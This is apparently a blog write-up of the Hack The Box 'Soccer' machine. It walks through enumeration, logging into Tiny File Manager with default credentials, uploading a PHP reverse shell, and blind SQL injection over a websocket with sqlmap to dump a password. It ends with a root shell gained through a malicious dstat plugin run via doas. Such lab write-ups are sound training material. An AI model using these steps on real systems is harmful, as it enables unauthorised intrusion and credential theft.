---
layout: post
title: "HTB: Soccer"
author: Andrew Cherney
date: 2023-06-17 11:30:20
tags: htb easy-box
icon: "assets/icons/soccer.png"
post_description: "Rev up that default credential list and reverse shell, since to get www-data you need to find the CMS and abuse both. Next your knowledge of websockets better be up to par, as a middleman server is needed to scrape an SQL database on a websocket. Last and certainly least GTFOBins gives us root."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Soccer]
└──╼ $nmap -sC 10.10.11.194
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-25 14:17 CST
Nmap scan report for 10.10.11.194
Host is up (0.053s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail
```

<h2>Port 80 - http</h2>

{% include img_link src="/img/soccer/Soccer_front_page" alt="front_page" ext="png" trunc=600 %}

Scanning for more content I find a reference to tiny.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Soccer]
└──╼ $gobuster dir --url http://soccer.htb/ --wordlist /opt/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/25 15:04:46 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

<h1>User as www-data</h1>

<h2>Default Creds</h2>

![Tiny File Manager](/img/soccer/Soccer_tiny_file_manager.png)

I dig around for a bit before deciding to try some default credentials. For this service admin:admin@123 are the defaults.

![Admin login](/img/soccer/Soccer_admin_login.png)

<h2>Reverse Shell Upload</h2>

Here we can see and interact with uploads on the site. If I head to the tiny/uploads directory I probably have access and can upload a pentestmonkey reverse shell. 

![Shell upload](/img/soccer/Soccer_shell_upload.png)

Now if I head to **http://soccer.htb/tiny/uploads/shell.php** I will get my reverse shell.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Soccer]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.194] 38740
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 21:25:37 up  1:09,  0 users,  load average: 0.04, 0.04, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1035): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:/$
```

Slight note, I did notice there was some maintenance happening and the shell would occasionally be removed. 

<h1>User as player</h1>

Using a python http server and wget I transfer over linpeas and see what is out there. But I didnt see anything, and that reminded me of a principle in easy/medium boxes that if it looks out of place or abnormal it's probably important. Cut to port 9091 again, let's revisit this now that we think www-data might be a dead end.

<h2>WebSocket</h2>

I can interact with this as a web socket with websocat. There isnt an official release for Debian so I needed to use [this release for generic linux](https://github.com/vi/websocat/releases/tag/v1.9.0). Then after making the command executable I can attempt to connect to that service.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Soccer]
└──╼ $./websocat_linux64 ws://soccer.htb:9091 -v
[INFO  websocat::lints] Auto-inserting the line mode
[INFO  websocat::stdio_threaded_peer] get_stdio_peer (threaded)
[INFO  websocat::ws_client_peer] get_ws_client_peer
[INFO  websocat::ws_client_peer] Connected to ws
```

<h2>SQLmap</h2>

Excellent, I have connected to WebSocket. Now in searching for vulnerabilities I found [this blind sqli over websocket](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html). After much messing around with python libraries, and changing two lines, I managed to get the middleman server working so I can run sqlmap on the target.

Lines changed:

```
ws_server = "ws://soccer.htb:9091/"
	data = '{"id":"%s"}' % message
```

In short the script will set up a local server on port 8081 which will handle all requests to be compliant with the requested data on the websocket. 

```bash
python3 websockpwn.py
sqlmap -u "http://localhost:8081/?id=1" --batch -dbs
.....
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
sqlmap -u "http://localhost:8081/?id=1" --tables soccer_db
.....
[16:59:05] [INFO] retrieved: 
[16:59:23] [ERROR] invalid character detected. retrying..
accou
[17:00:51] [ERROR] invalid character detected. retrying..
nts
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db -T accounts --dump
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Soccer]
└──╼ $ssh player@soccer.htb
player@soccer:~$ cat user.txt
5d81a3a0800c3-------------------
```

<h1>Root</h1>

<h2>doas</h2>

```bash
player@soccer:~$ find / -perm /4000 2>/dev/null
/usr/local/bin/doas
```

Looking around I can find that doas has a config file:

```bash
player@soccer:/usr/local/bin$ cat ../etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

I search for a dstat directory that I can write in since dstat will likely check there automatically. 

```bash
player@soccer:/usr/local/bin$ find / -name dstat 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat
/usr/bin/dstat
```

I pick the local share directory and find that GTFOBins has a dstat shell command and I will use that to gain a root shell through doas. 


```bash
player@soccer:/usr/local/share/dstat$ echo 'import os; os.execv("/bin/sh", ["sh"])' > dstat_xxx.py
player@soccer:/usr/local/share/dstat$ doas -u root "/usr/bin/dstat --xxx"
doas: Operation not permitted
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# cat /root/root.txt
ce73f1552a8828------------------
```

